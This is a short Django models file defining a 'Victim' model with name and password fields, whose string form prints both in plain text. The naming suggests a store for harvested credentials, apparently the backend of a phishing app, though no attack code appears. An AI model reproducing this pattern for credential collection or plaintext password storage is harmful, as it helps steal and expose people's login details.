from django.db import models

# Create your models here.

class Victim(models.Model):
	name = models.CharField(max_length=100)
	password = models.CharField(max_length=100)
	
	def __str__(self):
		user = self.name + " : " + self.password
		return user